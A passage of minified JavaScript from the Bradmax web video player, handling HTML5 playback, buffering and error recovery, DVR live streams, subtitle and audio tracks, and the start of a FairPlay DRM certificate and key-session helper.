q=c++;if(this.video.buffered.start(q)<=this.video.currentTime&&this.video.currentTime<=this.video.buffered.end(q)){b=!0;break}}b?this.iosIsStalledConnectionProblemsStart=null:(null==this.iosIsStalledConnectionProblemsStart&&(this.iosIsStalledConnectionProblemsStart=new Date),b=5e3,this.isAdsInsertionStream(this.media)&&(b=25e3),null!=this.iosIsStalledConnectionProblemsStart&&(new Date).getTime()-this.iosIsStalledConnectionProblemsStart.getTime()>b&&(null!=this.video&&this.video.pause(),this.iosIsStalledConnection=!0,this.onError({message:"Connection with server has stalled/broken. No data from server."})))}},isVideoElementPlaying:function(){var b=!0;if((h.isiOS||"Safari"==h.browserName)&&!h.isSamsungSmartTVTizen){b=null!=this.video&&null!=this.video.seekable&&0<this.video.seekable.length&&0<this.video.seekable.end(0)-this.video.seekable.start(0);var c=null!=this.video&&1/0==this.video.duration&&null!=this.video.buffered&&0<this.video.buffered.length&&0<this.video.buffered.end(0)-this.video.buffered.start(0)&&30>this.video.buffered.end(0)-this.video.buffered.start(0)&&this.video.buffered.start(0)<=this.video.currentTime&&this.video.currentTime<=this.video.buffered.end(0);b=b||c}return null!=this.video&&0<this.video.currentTime&&!this.video.paused&&!this.video.seeking&&!this.video.ended&&2<this.video.readyState&&b},isVideoCurrentTimeReliable:function(){return!(null==this.video||!this.isStartTimeInitialized||4!=this.video.readyState)&&(!this.isDvr()||1<this.video.currentTime)},onVideoDurationchange:function(){if(this.isEventFromRightContext()&&!this.isAirPlayCasting()){if(this.media instanceof va&&!(this.media instanceof xa)&&1/0==this.video.duration){for(var b=new xa,c=g.getInstanceFields(va),d=0;d<c.length;){var q=c[d];++d,b[q]=m.field(this.media,q)}this.media=b,(c=new aa("mediaAfterPlaybackStartMetadata")).data=b,c.dispatch(this.context)}if(this.media instanceof xa&&1/0!=this.video.duration&&0<this.video.duration){for(b=new va,c=g.getInstanceFields(va),d=0;d<c.length;)q=c[d],++d,b[q]=m.field(this.media,q);this.media=b,(c=new aa("mediaAfterPlaybackStartMetadata")).data=this.media,c.dispatch(this.context)}this.media.duration=this.video.duration,null!=this.prePlaybackSeekRelativePosition&&0<this.video.duration&&(b=this.prePlaybackSeekRelativePosition,this.prePlaybackSeekRelativePosition=null,b*=this.video.duration,c=1<Math.abs(this.video.currentTime-b),(2<Math.abs(this.video.duration-this.media.duration)||c)&&this.seek(b)),this.dispatchEvent(this.isAdvertisement?new Q("adDurationChange"):new T("durationChange"))}},onVideoWaiting:function(){this.isEventFromRightContext()&&(101<=this.state&&(this.state=101),this.dispatchEvent(new T("bufferingStart")),this.isBuffering=!0,this.stopAndroidHlsPlaybackEndWatchdogTimer(),(h.isiOS||"Safari"==h.browserName)&&!h.isSamsungSmartTVTizen||h.isAndroid)&&(this.stopMobileOrSafariBufferingTimeoutTimer(),this.mobileOrSafariBufferingTimeoutTimer=Rb.delay(U(this,this.onMobileOrSafariBufferingTimeout),14e3))},onMobileOrSafariBufferingTimeout:function(){this.stopMobileOrSafariBufferingTimeoutTimer(),this.mobileOrSafariBufferingTimeoutOccurred=!0,this.onError("Buffering timeout occured.")},onVideoEnded:function(){this.isEventFromRightContext()&&(this.stopLiveStreamEndingTimeout(),this.stopAndroidHlsPlaybackEndWatchdogTimer(),200!=this.state&&0!=this.state&&(this.state=200,this.dispatchEvent(this.isAdvertisement?new Q("adComplete"):new T("complete"))))},onVideoSeeking:function(){if(this.isEventFromRightContext()){this.stopAndroidHlsPlaybackEndWatchdogTimer();var b=this.state;this.state=101,this.dispatchEvent(this.isAdvertisement?new Q("seekingStart"):new T("seekingStart")),!h.isiOS&&"Safari"!=h.browserName||h.isSamsungSmartTVTizen||this.isBuffering||102!=b||(this.isBuffering=!0,this.dispatchEvent(new T("bufferingStart")))}},onVideoSeeked:function(){var b=this;if(this.isEventFromRightContext()&&(this.stopAndroidHlsPlaybackEndWatchdogTimer(),this.state=102,this.dispatchEvent(this.isAdvertisement?new Q("seekingEnd"):new T("seekingEnd")),!h.isiOS&&"Safari"!=h.browserName||h.isSamsungSmartTVTizen||!this.isVideoElementPlaying()||(this.storeStartPlayingPositionForCastingIos(),this.dispatchEvent(this.isAdvertisement?new Q("adPlaying"):new T("playing"))),!h.isiOS&&"Safari"!=h.browserName||h.isSamsungSmartTVTizen||!this.isBuffering||(this.isBuffering=!1,this.dispatchEvent(new T("bufferingEnd"))),(h.isiOS||"Safari"==h.browserName)&&!h.isSamsungSmartTVTizen&&null!=this.video&&0==this.video.currentTime&&this.video.paused)){var c=this.video.play();null!=c&&c.then((function(){b.video.pause()}))}},initDvrWindowStartTimestamp:function(){if(null==this.dvrPlaybackStartTs&&this.isDvr()){var b=this.getDVRWindowRangeRaw();null==b&&null!=this.video&&null!=this.video.buffered&&0<this.video.buffered.length&&(b={end:this.video.buffered.end(0)}),null!=b&&(this.dvrPlaybackStartTs=this.getNowTs()-b.end),null!=this.dvrPlaybackStartTs&&null!=this.dvrRequestedInitialTimeTs&&this.seek(this.dvrRequestedInitialTimeTs-this.dvrPlaybackStartTs)}},onVideoCanplaythrough:function(){this.isEventFromRightContext()&&(this.initStartTimeForLiveStreamEventRecording(),this.isPlaybackNotAllowed&&"Safari"==h.browserName&&!h.isSamsungSmartTVTizen?(this.stopInitializeAfterCanplaythrouTimer(),this.initializeAfterCanplaythrouTimer=Rb.delay(U(this,this.initializeAfterCanplaythrou),500)):this.initializeAfterCanplaythrou())},initStartTimeForLiveStreamEventRecording:function(){if((null==this.dvrPlaybackStartTs&&this.isDvr()||101==this.state)&&0<this.video.buffered.length&&0==this.currentTime&&null==this.getPlaybackStartTime(this.media)&&this.isDvr()&&.1>this.video.currentTime&&0<this.video.seekable.length){for(var b=null,c=0,d=this.video.seekable.length;c<d;){var q=c++;q=this.video.seekable.end(q),isFinite(q)&&(null==b||q>b)&&(b=q)}null!=b&&(this.video.currentTime=Math.max(0,b-15))}},initializeAfterCanplaythrou:function(){this.areSubtitlesAndAudioTracksInitialized||(this.updateSubtitlesSets(),this.updateAudioSets(),this.areSubtitlesAndAudioTracksInitialized=!0,"Safari"!=h.browserName||h.isSamsungSmartTVTizen||this.updateSafariStylingForSubtitles()),this.initVideoCurrentTime(),this.initDvrWindowStartTimestamp()},onVideoLoadedMetadata:function(){this.isEventFromRightContext()&&(!h.isiOS&&"Safari"!=h.browserName||h.isSamsungSmartTVTizen)&&this.initVideoCurrentTime()},initVideoCurrentTime:function(){if(1<=this.video.readyState&&!this.isStartTimeInitialized)if(0!=this.currentTime){var b=Math.floor(1e3*this.currentTime)/1e3;this.video.currentTime=b,this.isStartTimeInitialized=this.video.currentTime==b}else this.isStartTimeInitialized=!0},reset:function(){null!=this.video&&(this.video.pause(),this.video.setAttribute("src",""),this.video.load()),this.mediaSourceUrl="",this.isStartTimeInitialized=!1,this.fairPlayDrm.reset(),this.state=0},pause:function(){this.stopAndroidHlsPlaybackEndWatchdogTimer(),this.videoElementCommandAdd(2)},stopMobileOrSafariBufferingTimeoutTimer:function(){null!=this.mobileOrSafariBufferingTimeoutTimer&&(this.mobileOrSafariBufferingTimeoutTimer.stop(),this.mobileOrSafariBufferingTimeoutTimer=null)},reloadPlayerSourceAndCurrentTimeIfNeeded:function(){return null!=this.media&&null!=this.media.source&&null!=this.video&&this.mediaSourceUrl!=this.media.source[0].url?(this.video.src=this.mediaSourceUrl=this.media.source[0].url,this.state=0,this.mobileOrSafariBufferingTimeoutOccurred=this.hasCriticalErrorBeenDispatched=!1,!0):(this.video.getAttribute("src")!=this.mediaSourceUrl&&(h.isiOS&&(this.isStartTimeInitialized=!1),this.mobileOrSafariBufferingTimeoutOccurred=this.hasCriticalErrorBeenDispatched=!1,this.video.src=this.mediaSourceUrl),!1)},play:function(){this.stopAndroidHlsPlaybackEndWatchdogTimer(),this.reloadPlayerSourceAndCurrentTimeIfNeeded(),this.videoElementCommandAdd(1)},onAndrdoidHlsPlaybackStartTimout:function(){null!=this.androidHlsPlaybackWatchdogTimer&&this.androidHlsPlaybackWatchdogTimer.stop(),this.androidHlsPlaybackWatchdogTimer=null,null==this.video||1<this.video.readyState||0<this.video.currentTime||(this.video.currentTime=1)},videoElementCommandAdd:function(b){this.videoElementCommandsQueue.push(b),1==this.videoElementCommandsQueue.length&&null==this.videoElementPromise&&this.onVideoElementCommandComplete()},onVideoElementCommandComplete:function(){if(this.videoElementPromise=null,0!=this.videoElementCommandsQueue.length){var b=this.videoElementCommandsQueue.shift();1==b?this.videoElementCommandPlay():2==b?this.videoElementCommandPause():3==b?this.videoElementCommandPlayPause():console.error("ERROR: Invalid command type for VideoWeb ("+b+")")}},onPlayerResetWithMseExtension:function(){null!=this.video&&(this.video.removeEventListener("player_reset",U(this,this.onPlayerResetWithMseExtension)),this.videoElementCommandPlay())},videoElementCommandPlay:function(){if(null!=this.video&&this.video.hasAttribute("data-mse-resetting"))this.video.addEventListener("player_reset",U(this,this.onPlayerResetWithMseExtension));else{if(this.isPlaybackNotAllowed=!1,this.reloadPlayerSourceAndCurrentTimeIfNeeded(),0==this.state){var b=this.getM3U8MediaSource(this.media.source);h.isAndroid&&null!=b&&(this.androidHlsPlaybackWatchdogTimer=new Rb(7e3),this.androidHlsPlaybackWatchdogTimer.run=U(this,this.onAndrdoidHlsPlaybackStartTimout));var c=null!=b&&Object.prototype.hasOwnProperty.call(b.customParams.h,"laUrl")&&Object.prototype.hasOwnProperty.call(b.customParams.h,"certUrl"),d=null!=b&&null!=b.drm,q=null!=b&&null!=this.media.drmCustomLicenseServerHandler;if(q&&this.media.drmCustomLicenseServerHandler.initContext(this.media,b,this.variables),c||d||q)return this.video.load(),void this.fairPlayDrm.init(this.media,b)}if(null!=this.video&&(h.isiOS||"Safari"==h.browserName)&&!h.isSamsungSmartTVTizen&&1/0==this.video.duration){for(b=!1,c=0,d=this.video.buffered.length;c<d;)if(q=c++,this.video.buffered.start(q)<=this.video.currentTime&&this.video.currentTime<=this.video.buffered.end(q)){b=!0;break}if(b&&1==this.video.buffered.length&&null!=this.lastPausedTime&&(b=(b=((new Date).getTime()-this.lastPausedTime.getTime())/1e3)<(c=this.video.buffered.end(0)-this.video.buffered.start(0))),0<this.video.buffered.length&&!b)return this.log("BRADMAX PLAYER NOTICE:\nVideo paused outside DVR window. Restarting video for catching-up live stream.","warn"),void this.handlePlaybackRestart()}try{this.videoElementPromise=this.video.play(),null!=this.videoElementPromise&&this.videoElementPromise.catch(U(this,this.onPlayPromiseError)),null!=this.videoElementPromise&&(!h.isiOS&&"Safari"!=h.browserName||h.isSamsungSmartTVTizen)?this.videoElementPromise.then(U(this,this.onVideoElementCommandComplete),U(this,this.onVideoElementCommandComplete)):this.onVideoElementCommandComplete()}catch(X){console.error("Error occured during play call on video HtmlMediaElement."),this.onVideoElementCommandComplete()}}},log:function(b,c){null==c&&(c="log"),console&&("error"==c?console.error(b):"warn"==c?console.warn(b):console.log(b))},onPlayPromiseError:function(b){var c=this;null!=b&&"AbortError"==b.name&&null!=this.video&&null!=this.video.src&&-1!=this.video.src.indexOf("data:video/mp4;base64,")||(null==b||"NotAllowedError"!=b.name&&"AbortError"!=b.name?(this.log("BRADMAX PLAYER NOTICE:\nException occured durring starting player. Details below:\n","error"),this.log(b,"error")):(this.isPlaybackNotAllowed=!0,this.variables.autoplay?this.log("BRADMAX PLAYER NOTICE:\nBrowser doesn't allow for autoplaying video without user interaction.\nPlayer is waiting for user 'play' click. You can autoplay muted video (mute=true).\n\nMode details about browser autoplay policy: https://developers.google.com/web/updates/2017/09/autoplay-policy-changes","warn"):(this.log("BRADMAX PLAYER NOTICE:\nBrowser block starting playing video. Details below:\n","warn"),this.log(b,"warn")),Rb.delay((function(){c.isBuffering=!1,c.dispatchEvent(new T("bufferingEnd")),c.dispatchEvent(c.isAdvertisement?new Q("adPlaying"):new T("playing")),c.dispatchEvent(c.isAdvertisement?new Q("adPaused"):new T("paused"))}),0)))},videoElementCommandPause:function(){this.video.pause(),this.onVideoElementCommandComplete()},videoElementCommandPlayPause:function(){this.video.paused?this.videoElementCommandPlay():this.videoElementCommandPause()},stopPlaybackRestartTimeoutTimer:function(){null!=this.playbackRestartTimeoutTimer&&(this.playbackRestartTimeoutTimer.stop(),this.playbackRestartTimeoutTimer=null)},stopIos15ErrorTimeoutTimer:function(){null!=this.ios15ErrorTimoutTimer&&(this.ios15ErrorTimoutTimer.stop(),this.ios15ErrorTimoutTimer=null)},stopInitializeAfterCanplaythrouTimer:function(){null!=this.initializeAfterCanplaythrouTimer&&(this.initializeAfterCanplaythrouTimer.stop(),this.initializeAfterCanplaythrouTimer=null)},stopLiveEdgeUpdateTimer:function(){null!=this.liveEdgeUpdateTimer&&(this.liveEdgeUpdateTimer.stop(),this.liveEdgeUpdateTimer=null)},onLiveEdgeUpdate:function(){null!=this.video&&this.video.paused&&!this.video.seeking&&!this.video.ended&&2<this.video.readyState&&this.onVideoTimeupdate()},hasLiveStreamEnded:function(){if(!(this.media instanceof Ca))return!1;var b=this.media;return null==b.streamEnd||b.streamEnd.getTime()<(new Date).getTime()},hasVideoErrorCode:function(){return null!=this.video&&null!=this.video.error&&0<=this.video.error.code},onErrorIos15Safari:function(b){var c=this,d=this.video.currentTime;null!=this.video&&null!=this.video.error&&3==this.video.error.code?(this.stopIos15ErrorTimeoutTimer(),this.ios15ErrorTimoutTimer=Rb.delay((function(){null!=c.video&&d!=c.video.currentTime||c.onError(b)}),2e3)):this.onError(b)},onError:function(b){if(this.isAdvertisement&&!this.isInStreamAdvertisement)this.dispatchEvent(new Q("adMediaError"),this.prepareErrorMessage(b));else if(!(this.hasCriticalErrorBeenDispatched||!this.isEventFromRightContext()||10==this.state&&!this.hasVideoErrorCode()||150==this.state||(this.stopPlaybackRestartTimeoutTimer(),this.stopAndroidHlsPlaybackEndWatchdogTimer(),this.stopIos15ErrorTimeoutTimer(),200<=this.state))){if(this.media instanceof Ca){var c=this.hasLiveStreamEnded();if(!c&&5<=this.onErrorFallbackTriesNum&&--this.onErrorFallbackTriesNum,c)return void this.handleLiveStreamEnding()}c=this.isDvr()?5:3;var d=h.isAndroid&&!this.isNetworkConnectionProblem(),q=this.isDvr()&&this.media.hasFallbackSources(),X=this.isDvr()&&102==this.state;(103==this.state||101==this.state||X)&&this.onErrorFallbackTriesNum<c&&!d&&!q?(this.stopPlaybackRestartTimeoutTimer(),this.state=150,this.playbackRestartTimeoutTimer=Rb.delay(U(this,this.handlePlaybackRestart),1e3*(this.onErrorFallbackTriesNum+1)),b={videowebError:b,currTry:this.onErrorFallbackTriesNum},this.dispatchEvent(this.isAdvertisement&&!this.isInStreamAdvertisement?new Q("adMediaErrorFallbackTry"):new T("mediaErrorFallbackTry"),b)):(c=this.state,this.state=210,this.stopMobileOrSafariBufferingTimeoutTimer(),this.isNetworkConnectionProblem()?this.dispatchEvent(this.isAdvertisement&&!this.isInStreamAdvertisement?new Q("adConnectionError"):new T("connectionError"),this.prepareErrorMessage(b)):(!this.hasVideoErrorCode()&&(10<=c&&15>=c||20==c)?(this.hasCriticalErrorBeenDispatched=!0,this.dispatchEvent(new T("drmAuthenticationError"),this.prepareErrorMessage(b))):null!=this.video&&3==this.video.networkState?(this.hasCriticalErrorBeenDispatched=!0,this.dispatchEvent(this.isAdvertisement&&!this.isInStreamAdvertisement?new Q("adMediaError"):new T("loadError"),this.prepareErrorMessage(b))):(this.hasCriticalErrorBeenDispatched=!0,this.dispatchEvent(this.isAdvertisement&&!this.isInStreamAdvertisement?new Q("adMediaError"):new T("mediaError"),this.prepareErrorMessage(b))),this.reset()))}},onIosStalled:function(b){this.iosIsStalledConnectionDetectionEnabled=!0},prepareErrorMessage:function(b){var c=this.isNetworkConnectionProblem()&&(this.media instanceof Ca||0<this.video.currentTime||null!=this.video.error&&2==this.video.error.code||null!=this.media.mediaUserSettings&&0<this.media.mediaUserSettings.resumePostion),d="";return null!=this.video&&null!=this.video.error&&(d+=" code: ",d=1==this.video.error.code?d+"MEDIA_ERR_ABORTED":2==this.video.error.code?d+"MEDIA_ERR_NETWORK":3==this.video.error.code?d+"MEDIA_ERR_DECODE":4==this.video.error.code?d+"MEDIA_ERR_SRC_NOT_SUPPORTED":d+this.video.error.code),null!=this.video&&null!=this.video.networkState&&(d+=" net: ",d=0==this.video.networkState?d+"NETWORK_EMPTY":1==this.video.networkState?d+"NETWORK_IDLE":2==this.video.networkState?d+"NETWORK_LOADING":3==this.video.networkState?d+"NETWORK_NO_SOURCE":d+this.video.networkState),null!=this.video&&null!=this.video.src&&(d+="\nurl: "+this.video.src),null!=b&&(this.log("bradmax.player.error: Error occured durring playback. "+d,"error"),this.log(b,"error")),{errObj:b,isTemporaryNetworkIssue:c,message:d}},stopLiveStreamEndingTimeout:function(){null!=this.liveStreamEndingTimeout&&(this.liveStreamEndingTimeout.stop(),this.liveStreamEndingTimeout=null)},handleLiveStreamEnding:function(){new W("skinPause").dispatch(this.context),this.state=180,this.stopLiveStreamEndingTimeout(),this.stopAndroidHlsPlaybackEndWatchdogTimer(),this.liveStreamEndingTimeout=Rb.delay(U(this,this.onVideoEnded),500)},isNetworkConnectionProblem:function(){return null!=this.video&&null!=this.media&&(!!(!sb.navigator.onLine||this.mobileOrSafariBufferingTimeoutOccurred||null!=this.video.error&&2==this.video.error.code||this.iosIsStalledConnection)||3==this.video.networkState&&(null!=this.video.error&&4!=this.video.error.code))},handlePlaybackRestart:function(){this.onErrorFallbackTriesNum++;var b=this.currentTime;this.video.pause(),this.video.setAttribute("src",""),this.video.load(),this.mediaSourceUrl="",this.isStartTimeInitialized=!1,this.isDvr()||this.seek(b),this.fairPlayDrm.reset(),this.state=0,this.play()},playPause:function(){this.videoElementCommandAdd(3)},seek:function(b){0<this.video.duration&&b+1>=this.video.duration&&(b=this.video.duration-1);var c=this.video.paused&&(null==this.video.getAttribute("src")||""==this.video.getAttribute("src"))&&null!=this.media&&0<this.media.duration;c&&(this.prePlaybackSeekRelativePosition=b/this.media.duration),this.isDvr()&&(b=this.dvrWindowTimeToDvrRelativePlaybackTime(b)),this.currentTime=b,this.reloadPlayerSourceAndCurrentTimeIfNeeded(),this.stopAndroidHlsPlaybackEndWatchdogTimer(),!c&&1<=this.video.readyState&&0<=this.currentTime&&isFinite(this.currentTime)&&(this.video.currentTime=this.currentTime),c&&this.video.load(),!this.video.paused||"Microsoft Internet Explorer"!=h.browserName&&"Edge"!=h.browserName||this.preloadPausedVideoAfterSeek()},preloadPausedVideoAfterSeek:function(){var b=this;try{var c=this.video.play();null!=c?c.then((function(){b.video.pause()})):this.video.pause()}catch(d){console.error("Error occured during seeking in VideoWeb component, when video was played.")}},selectAudio:function(b){},selectSubtitles:function(b){},volume:function(b){this.video.volume=b},isEventFromRightContext:function(){return null!=this.video&&null!=this.media&&null!=this.media.source&&this.video.getAttribute("src")==this.media.source[0].url},setData:function(b){this.media=b,this.isStartTimeInitialized=this.areSubtitlesAndAudioTracksInitialized=!1,this.onErrorFallbackTriesNum=0,this.mobileOrSafariBufferingTimeoutOccurred=this.hasCriticalErrorBeenDispatched=this.isPlaybackNotAllowed=this.iosIsStalledConnectionDetectionEnabled=this.iosIsStalledConnection=!1,this.stopAndroidHlsPlaybackEndWatchdogTimer(),this.stopInitializeAfterCanplaythrouTimer(),this.mediaSourceUrl=b.source[0].url,null!=this.video&&null!=this.video.src&&0<this.video.duration&&(this.pause(),null!=this.video.seekable&&0<this.video.seekable.length&&(this.video.currentTime=this.video.seekable.start(0))),Object.prototype.hasOwnProperty.call(this.variables,"dvrWindowStartTime")?(this.dvrWindowStartTimeTs=m.field(this.variables,"dvrWindowStartTime"),this.getNowTs()<this.dvrWindowStartTimeTs&&(this.dvrWindowStartTimeTs=null),m.deleteField(this.variables,"dvrWindowStartTime")):this.dvrWindowStartTimeTs=null,Object.prototype.hasOwnProperty.call(this.variables,"dvrWindowEndTime")?(this.dvrWindowEndTimeTs=m.field(this.variables,"dvrWindowEndTime"),m.deleteField(this.variables,"dvrWindowEndTime")):this.dvrWindowEndTimeTs=null,this.dvrWindowTailLastSend=this.dvrRequestedInitialTimeTs=this.dvrPlaybackStartTs=null,this.currentTime=0,this.prePlaybackSeekRelativePosition=null,null!=(b=this.getPlaybackStartTime(b))&&0<b&&(this.currentTime=b),this.state=0,1==this.variables.autoplay&&this.play()},getPlaybackStartTime:function(b){var c=null;return null!=this.dvrWindowStartTimeTs&&null!=this.dvrWindowEndTimeTs&&this.dvrWindowEndTimeTs<this.getNowTs()&&this.isDvr()&&(this.dvrRequestedInitialTimeTs=c=this.dvrWindowStartTimeTs),null!=b&&null!=b.mediaUserSettings&&null!=b.mediaUserSettings.resumePostion&&(c=b.mediaUserSettings.resumePostion),null==c&&null!=this.dvrWindowStartTimeTs&&c<this.dvrWindowStartTimeTs&&(c=this.dvrWindowStartTimeTs),null==c&&null!=this.dvrWindowEndTimeTs&&this.dvrWindowEndTimeTs<c&&(c=this.dvrWindowEndTimeTs),this.isDvr()&&null!=c&&(this.dvrRequestedInitialTimeTs=c),c},playerResize:function(b){},videoReady:function(){},onDurationChange:function(b){},updateSubtitlesSets:function(){var b=this.video.textTracks;if(null!=b&&0<b.length){for(var c=[],d=0;d<b.length;){var q=b[d];if(++d,null!=q.language&&""!=q.language){var X=new Ab;X.id=q.language+"",X.name=ba.normalizeLanguageNameFormat(ba.getLanguageNativeNameByCode(q.language)),X.languageCode=q.language,c.push(X)}}null!=this.variables.subtitles&&0<c.length&&ba.preselectSubtitlesSet(this.variables.subtitles,c),0<c.length&&((b=new aa("subtitleData")).data=c,b.dispatch(this.context))}},onSelectSubtitles:function(b){if(null!=b&&null!=this.video)if(null!=(b=b.data)){for(var c=this.video.textTracks,d=null,q=0;q<c.length;){var X=c[q];++q,X.mode="hidden",X.language==b.id&&(d=X)}null!=d&&(d.mode="showing")}else for(c=this.video.textTracks,q=0;q<c.length;)X=c[q],++q,X.mode="hidden"},updateAudioSets:function(){var b=this.video.audioTracks;if(null!=b&&b.length>=this.minAudioTracksForInfo){for(var c=[],d=0;d<b.length;){var q=b[d];if(++d,null!=q.language&&""!=q.language){var X=new $a;X.id=p.string(q.language)+"",X.name=ba.normalizeLanguageNameFormat(ba.getLanguageNativeNameByCode(q.language)),null!=X.name&&""!=X.name||(X.name=q.label),null!=X.name&&""!=X.name||(X.name=q.language),X.languageCode=q.language,X.isDefault=q.enabled,c.push(X)}}c.length>=this.minAudioTracksForInfo&&((b=new aa("audioData")).data=c,b.dispatch(this.context))}},onSelectAudio:function(b){var c=this;if(null!=b&&null!=this.video){var d=b.data;if(null!=d&&this.getActiveTrackLanguage()!=d.id){var q=!this.video.paused;q&&this.video.pause(),Rb.delay((function(){var X=fb.__cast(c.video,HTMLVideoElement).audioTracks;if(null!=X){for(var ra=0;ra<X.length;){var Aa=X[ra];++ra,Aa.enabled=!1}if(null!=d)for(ra=0;ra<X.length;)Aa=X[ra],++ra,Aa.language==d.id&&(Aa.enabled=!0)}q&&c.video.play()}),100)}}},getActiveTrackLanguage:function(){var b=null,c=fb.__cast(this.video,HTMLVideoElement).audioTracks;if(null==c)return b;for(var d=0;d<c.length;){var q=c[d];if(++d,q.enabled){b=q.language;break}}return b},onPlayerResizeEvent:function(b){"Safari"!=h.browserName||h.isSamsungSmartTVTizen||this.updateSafariStylingForSubtitles()},onWindowResize:function(){"Safari"!=h.browserName||h.isSamsungSmartTVTizen||(this.updateSafariStylingForSubtitles(),Rb.delay(U(this,this.updateSafariStylingForSubtitles),300))},updateSafariStylingForSubtitles:function(){if(null!=this.video){if(!Pb.subtitlesStylesForSafariInitialized){for(var b="",c=0;100>c;){var d=c++;b+="video.bs-subs-top"+d+"::-webkit-media-text-track-container {top:"+d+"%;overflow:visible;} ",b+="video.bs-subs-height"+d+"::-webkit-media-text-track-container {height:"+d+"%;} "}for(c=10;80>c;)b+="video.bs-subs-fontsize"+(d=c++)+"::cue {font-size:"+d+"px;} ";(d=document.createElement("style")).setAttribute("type","text/css"),d.innerHTML=b,document.body.appendChild(d),Pb.subtitlesStylesForSafariInitialized=!0}b=this.video.clientWidth,d=this.video.clientHeight,c=this.video.videoWidth;var q=this.video.videoHeight;if(0<c&&0<q&&0<b&&0<d){q=this.getVideoVisibleVideoSize(b,d,c,q);var X=[];c=0;for(var ra=this.video.classList;c<ra.length;){var Aa=ra[c];++c,null!=Aa&&0!=Aa.indexOf("bs-subs-")&&X.push(Aa)}c=X.join(" ")+" ",d>b&&0<q.y&&(q=this.adjustSubtitlesPlaceholderForMobiles(b,d,q),X=Math.floor(100*q.h/d),c+="bs-subs-top"+Math.floor(100*q.y/d)+" bs-subs-height"+X+" bs-subs-fontsize"+Math.ceil(.05*Math.min(q.w,q.h))),b>d&&h.isiPhone&&(c+=" bs-subs-height"+(X=100-Math.ceil(3e3/d))+" "),this.video.setAttribute("class",c)}}},getVideoVisibleVideoSize:function(b,c,d,q){var X=d/q;if(b/c>d/q)var ra=c,Aa=c/q*d;else ra=(Aa=b)/d*q;return Aa/ra>X?(Aa=ra,ra*=X):(ra=Aa,Aa/=X),{x:(b-ra)/2,y:(c-Aa)/2,w:ra,h:Aa}},adjustSubtitlesPlaceholderForMobiles:function(b,c,d){return c>b&&0<d.y?{x:d.x,y:Math.floor(d.y/2),w:d.w,h:d.h+d.y}:d},getM3U8MediaSource:function(b){for(var c=0;c<b.length;){var d=b[c];if(++c,"m3u8"==Pb.getExtension(d.url))return d}return null},isAdsInsertionStream:function(b){return null!=b.source&&0<b.source.length&&null!=b.source[0]&&1==b.source[0].customParams.h.yospaceStream},saveBandwidthModeVisibilityChange:function(b){},__class__:Pb};var Ze=function(b){this.videoWeb=b,this.initialized=!1,this.initKeySessionData=null};wa["bs.player.plugin.video.videoPlayer.VideoWebHelperForFairPlayDrm"]=Ze,Ze.__name__="bs.player.plugin.video.videoPlayer.VideoWebHelperForFairPlayDrm",Ze.prototype={videoWeb:null,initialized:null,laUrl:null,certUrl:null,certificate:null,keySystem:null,keySession:null,stepTimeoutTimer:null,drmProvider:null,drmCustomData:null,initKeySessionData:null,currMedia:null,reset:function(){this.clearStepTimeoutTimer(),null!=this.keySession&&(this.keySession.removeEventListener("webkitkeymessage",U(this,this.onLicenseWaiting),!1),this.keySession.removeEventListener("webkitkeyadded",U(this,this.onKeyAdded),!1),this.keySession.removeEventListener("webkitkeyerror",U(Oa=this.videoWeb,Oa.onError),!1)),this.initialized=!1,this.initKeySessionData=this.stepTimeoutTimer=this.keySession=this.keySystem=this.certificate=this.certUrl=this.laUrl=null},setStepTimeoutTimer:function(){this.clearStepTimeoutTimer(),this.stepTimeoutTimer=Rb.delay(U(this,this.onStepTimeout),3e4)},clearStepTimeoutTimer:function(){null!=this.stepTimeoutTimer&&(this.stepTimeoutTimer.stop(),this.stepTimeoutTimer=null)},init:function(b,c){if("Safari"!=h.browserName)this.videoWeb.onError("FairPlay DRM is not supported by this browser.");else{this.videoWeb.state=10,this.currMedia=b,this.setStepTimeoutTimer();var d=null;try{d=c.drm.provider}catch(q){}this.drmProvider=null!=d?d.toLowerCase():null;try{this.certUrl=c.customParams.h.certUrl,this.laUrl=c.customParams.h.laUrl}catch(q){}try{null==this.certUrl&&(this.certUrl=c.drm.fairplay.certUrl,this.laUrl=c.drm.fairplay.laUrl)}catch(q){}try{this.drmCustomData=c.drm.fairplay.customData}catch(q){}"ezdrm"==d||"keyos"==d||"default"==d?((b=new XMLHttpRequest).responseType="arraybuffer",b.addEventListener("load",U(this,this.onCertificateResponseRawBytes),!1),b.addEventListener("error",U(this,this.onServerCertificateDownloadError),!1),b.open("GET",this.certUrl,!0),b.send()):null==b.drmCustomLicenseServerHandler?((b=new L(this.certUrl)).setHeader("Accept","application/json"),b.onData=U(this,this.onCertificateResponse),b.onError=U(this,this.onServerCertificateDownloadError),b.request(!0)):b.drmCustomLicenseServerHandler.customFairplayCertificateRequestHandler(U(this,this.onCertificateResponse),U(this,this.onServerCertificateDownloadError))}},onServerCertificateDownloadError:function(b){this.videoWeb.state=11,this.videoWeb.onError("DRM initialization error. Error occurred during DRM server certificate download.")},onCertificateResponseRawBytes:function(b){this.videoWeb.state=11,this.setStepTimeoutTimer(),this.certificate=new Uint8Array(b.target.response),this.videoWeb.video.play()},onCertificateResponse:function(b){if(this.videoWeb.state=11,this.setStepTimeoutTimer(),b=JSON.parse(b),!Object.prototype.hasOwnProperty.call(b,"certificate"))throw Error("Cannot initialize DRM module.");this.certificate=this.base64DecodeUint8Array(b.certificate),this.videoWeb.video.play(),null!=this.initKeySessionData&&(b=this.initKeySessionData,this.initKeySessionData=null,this.initKeySession(b))},onNeedKey:function(b){"Safari"!=h.browserName?this.videoWeb.onError("FairPlay DRM is not supported by this browser."):null==this.certificate?this.initKeySessionData=b.initData:this.initKeySession(b.initData)},initKeySession:function(b){12>this.videoWeb.state&&(this.setStepTimeoutTimer(),this.videoWeb.state=12);var c=this.extractContentId(b,!0),d=this.concatInitDataIdAndCertificate(b,c,this.certificate);this.videoWeb.video.webkitKeys||(this.keySystem=this.selectKeySystem(),this.videoWeb.video.webkitSetMediaKeys(new window.WebKitMediaKeys(this.keySystem))),this.videoWeb.video.webkitKeys||this.videoWeb.onError("DRM initialization error. Could not create MediaKeys."),this.keySession=this.videoWeb.video.webkitKeys.createSession("video/mp4",d),null==this.keySession&&this.videoWeb.onError("DRM initialization error. Could not create key 